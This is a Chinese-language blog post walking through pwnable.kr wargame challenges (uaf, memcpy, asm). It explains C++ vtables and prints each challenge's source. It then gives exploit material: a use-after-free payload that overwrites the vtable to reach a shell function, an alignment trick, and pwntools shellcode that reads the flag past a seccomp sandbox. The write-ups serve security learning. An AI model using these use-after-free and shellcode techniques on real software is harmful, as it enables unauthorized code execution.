---
title: pwnable.kr_刷刷刷
abbrlink: 1345
date: 2018-09-21 15:24:39
tags:
---

## Uaf

**虚函数，一旦一个类有虚函数，编译器会为这个类建立一张vtable。子类继承父类vtable中所有项，当子类有同名函数时，修改vtable同名函数地址，改为指向子类的函数地址，子类有新的虚函数时，在vtable中添加。记住，私有函数无法继承，但如果私有函数是虚函数，vtable中会有相应的函数地址，所有子类可以通过手段得到父类的虚私有函数。**

**vptr每个对象都会有一个，而vptable是每个类有一个vptr指向vtable，一个类中就算有多个虚函数，也只有一个vptr，做多重继承的时候，继承了多个父类，就会有多个vptr**

**虚函数表的结构：它是一个函数指针表，每一个表项都指向一个函数。任何一个包含至少一个虚函数的类都会有这样一张表。需要注意的是vtable只包含虚函数的指针，没有函数体。实现上是一个函数指针的数组。虚函数表既有继承性又有多态性。每个派生类的vtable继承了它各个基类的vtable，如果基类vtable中包含某一项，则其派生类的vtable中也将包含同样的一项，但是两项的值可能不同。如果派生类覆写(override)了该项对应的虚函数，则派生类vtable的该项指向覆写后的虚函数，没有覆写的话，则沿用基类的值。
每一个类只有唯一的一个vtable，不是每个对象都有一个vtable，恰恰是每个同一个类的对象都有一个指针，这个指针指向该类的vtable（当然，前提是这个类包含虚函数）.那么，每个对象只额外增加了一个指针的大小，一般说来是4字节。
在类对象的内存布局中，首先是该类的vtable指针，然后才是对象数据。                                                                           在通过对象指针调用一个虚函数时，编译器生成的代码将先获取对象类的vtable指针，然后调用vtable中对应的项。对于通过对象指针调用的情况，在编译期间无法确定指针指向的是基类对象还是派生类对象，或者是哪个派生类的对象。但是在运行期间执行到调用语句时，这一点已经确定，编译后的调用代码能够根据具体对象获取正确的vtable，调用正确的虚函数，从而实现多态性。**

全文地址请点击：https://blog.csdn.net/qq_20307987/article/details/51511230?utm_source=copy 

根据源代码，可知:

```c
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}
```

思路: 执行步骤，3-2-2-1，第二次调用2的时候，将`introduce`的地址覆盖为`give_shell`的地址。

操作:

```
python -c "print '\x68\x15\x40\x00\x00\x00\x00\x00'" > /tmp/uaf
./uaf 8 /tmp/uaf
```

## memcpy

```
// compiled with : gcc -o memcpy memcpy.c -m32 -lm
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <sys/mman.h>
#include <math.h>

unsigned long long rdtsc(){
        asm("rdtsc");
}

char* slow_memcpy(char* dest, const char* src, size_t len){
	int i;
	for (i=0; i<len; i++) {
		dest[i] = src[i];
	}
	return dest;
}

char* fast_memcpy(char* dest, const char* src, size_t len){
	size_t i;
	// 64-byte block fast copy
	if(len >= 64){
		i = len / 64;
		len &= (64-1);
		while(i-- > 0){
			__asm__ __volatile__ (
			"movdqa (%0), %%xmm0\n"
			"movdqa 16(%0), %%xmm1\n"
			"movdqa 32(%0), %%xmm2\n"
			"movdqa 48(%0), %%xmm3\n"
			"movntps %%xmm0, (%1)\n"
			"movntps %%xmm1, 16(%1)\n"
			"movntps %%xmm2, 32(%1)\n"
			"movntps %%xmm3, 48(%1)\n"
			::"r"(src),"r"(dest):"memory");
			dest += 64;
			src += 64;
		}
	}

	// byte-to-byte slow copy
	if(len) slow_memcpy(dest, src, len);
	return dest;
}

int main(void){

	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	printf("Hey, I have a boring assignment for CS class.. :(\n");
	printf("The assignment is simple.\n");

	printf("-----------------------------------------------------\n");
	printf("- What is the best implementation of memcpy?        -\n");
	printf("- 1. implement your own slow/fast version of memcpy -\n");
	printf("- 2. compare them with various size of data         -\n");
	printf("- 3. conclude your experiment and submit report     -\n");
	printf("-----------------------------------------------------\n");

	printf("This time, just help me out with my experiment and get flag\n");
	printf("No fancy hacking, I promise :D\n");

	unsigned long long t1, t2;
	int e;
	char* src;
	char* dest;
	unsigned int low, high;
	unsigned int size;
	// allocate memory
	char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

	size_t sizes[10];
	int i=0;

	// setup experiment parameters
	for(e=4; e<14; e++){	// 2^13 = 8K
		low = pow(2,e-1);
		high = pow(2,e);
		printf("specify the memcpy amount between %d ~ %d : ", low, high);
		scanf("%d", &size);
		if( size < low || size > high ){
			printf("don't mess with the experiment.\n");
			exit(0);
		}
		sizes[i++] = size;
	}

	sleep(1);
	printf("ok, lets run the experiment with your configuration\n");
	sleep(1);

	// run experiment
	for(i=0; i<10; i++){
		size = sizes[i];
		printf("experiment %d : memcpy with buffer size %d\n", i+1, size);
		dest = malloc( size );

		memcpy(cache1, cache2, 0x4000);		// to eliminate cache effect
		t1 = rdtsc();
		slow_memcpy(dest, src, size);		// byte-to-byte memcpy
		t2 = rdtsc();
		printf("ellapsed CPU cycles for slow_memcpy : %llu\n", t2-t1);

		memcpy(cache1, cache2, 0x4000);		// to eliminate cache effect
		t1 = rdtsc();
		fast_memcpy(dest, src, size);		// block-to-block memcpy
		t2 = rdtsc();
		printf("ellapsed CPU cycles for fast_memcpy : %llu\n", t2-t1);
		printf("\n");
	}

	printf("thanks for helping my experiment!\n");
	printf("flag : ----- erased in this source code -----\n");
	return 0;
}
```

要点:

- `fast_memcpy`函数中用于内存复制的两个指令`movdqa`和`movntps`他们的操作数如果是内存地址的话，那么这个地址必须是16字节对齐的，否则会产生一般保护性异常导致程序退出。
- `malloc`在分配内存时它实际上还会多分配4字节用于存储堆块信息，所以如果分配a字节实际上分配的是`a+4`字节。另外32位系统上该函数分配的内存是以8字节对齐的。

解题思路:

每次分配的内存地址能够被16整除就可以了（实际上由于`malloc`函数分配的内存8字节对齐，只要内存大小除以16的余数大于9就可以了）。

```
#-*- coding:utf8
from pwn import *

io = remote("pwnable.kr", 9022)
context.log_level = "debug"
for i in range(10):
    io.recvuntil(":")
    data = (2 ** (i + 4) / 16 - 1) * 16 + 9
    io.sendline(str(data))

io.interactive()
```

## asm

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
	if (ctx == NULL) {
		printf("seccomp error\n");
		exit(0);
	}

	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

	if (seccomp_load(ctx) < 0){
		seccomp_release(ctx);
		printf("seccomp error\n");
		exit(0);
	}
	seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	printf("Welcome to shellcoding practice challenge.\n");
	printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
	printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
	printf("If this does not challenge you. you should play 'asg' challenge :)\n");

	char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
	memset(sh, 0x90, 0x1000);
	memcpy(sh, stub, strlen(stub));
	
	int offset = sizeof(stub);
	printf("give me your x64 shellcode: ");
	read(0, sh+offset, 1000);

	alarm(10);
	chroot("/home/asm_pwn");	// you are in chroot jail. so you can't use symlink in /tmp
	sandbox();
	((void (*)(void))sh)();
	return 0;
}
```

首先查看stub的内容:

```shell
qianfa@qianfa:~/Desktop/pwnable/asm$ disasm 4831c04831db4831c94831d24831f64831ff4831ed4d31c04d31c94d31d24d31db4d31e44d31ed4d31f64d31ff
   0:    48                       dec    eax
   1:    31 c0                    xor    eax, eax
   3:    48                       dec    eax
   4:    31 db                    xor    ebx, ebx
   6:    48                       dec    eax
   7:    31 c9                    xor    ecx, ecx
   9:    48                       dec    eax
   a:    31 d2                    xor    edx, edx
   c:    48                       dec    eax
   d:    31 f6                    xor    esi, esi
   f:    48                       dec    eax
  10:    31 ff                    xor    edi, edi
  12:    48                       dec    eax
  13:    31 ed                    xor    ebp, ebp
  15:    4d                       dec    ebp
  16:    31 c0                    xor    eax, eax
  18:    4d                       dec    ebp
  19:    31 c9                    xor    ecx, ecx
  1b:    4d                       dec    ebp
  1c:    31 d2                    xor    edx, edx
  1e:    4d                       dec    ebp
  1f:    31 db                    xor    ebx, ebx
  21:    4d                       dec    ebp
  22:    31 e4                    xor    esp, esp
  24:    4d                       dec    ebp
  25:    31 ed                    xor    ebp, ebp
  27:    4d                       dec    ebp
  28:    31 f6                    xor    esi, esi
  2a:    4d                       dec    ebp
  2b:    31 ff                    xor    edi, edi
```

大体上就是将部分寄存器的值清0。

直接操作:

```
#-*- coding:utf8
from pwn import *

# context.log_level = 'debug'
context(arch='amd64', os='linux')

p = ssh(host="pwnable.kr", port=2222, user="asm", password="guest")
io = p.connect_remote("0", 9026)

shellcode = ''
shellcode += shellcraft.open("this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong")
shellcode += shellcraft.read("rax", "rsp", 100)          // 
shellcode += shellcraft.write(1, 'rsp', 100)
io.recvuntil("code:")
io.send(asm(shellcode))
print io.interactive()
```

## unlink

```

```



